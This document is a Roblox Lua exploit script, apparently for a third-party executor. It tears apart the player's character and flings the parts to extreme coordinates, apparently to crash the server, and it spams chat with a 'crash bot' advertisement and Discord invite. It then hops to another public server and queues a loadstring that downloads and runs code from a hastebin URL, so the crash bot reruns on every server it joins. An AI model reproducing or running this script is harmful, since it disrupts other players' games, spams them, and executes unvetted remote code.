repeat wait() until game.Players.LocalPlayer.Character
game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart",2e14)
game.Players.LocalPlayer.Character:WaitForChild("Jacket-Hoodie-Black_7192553841",2e14)
wait()
for i,v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
   if v:IsA("Motor6D") and v.Name ~= "Neck"  then
       pro = v.Parent
       v:Destroy()
       pro.CFrame = CFrame.new(9e9 * i,9e9* i,9e9*i)
wait()
   end
end

spawn(function()
    while true do
        for i = 1,6 do
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("wacky and quirky crash bot!!! .gg/8KmvQxAu","All")
        end
        wait(3)
    end
end)

wait(20)

local x = {}
    for _, v in ipairs(game:GetService("HttpService"):JSONDecode(game:HttpGetAsync("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")).data) do
        if type(v) == "table" and v.maxPlayers > v.playing and v.id ~= game.JobId then
            x[#x + 1] = v.id
        end
    end
    if #x > 0 then
        game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, x[math.random(1, #x)])
    end
 
syn.on_queue_teleport('loadstring(game:HttpGet("https://www.toptal.com/developers/hastebin/raw/azedapoqup"))')
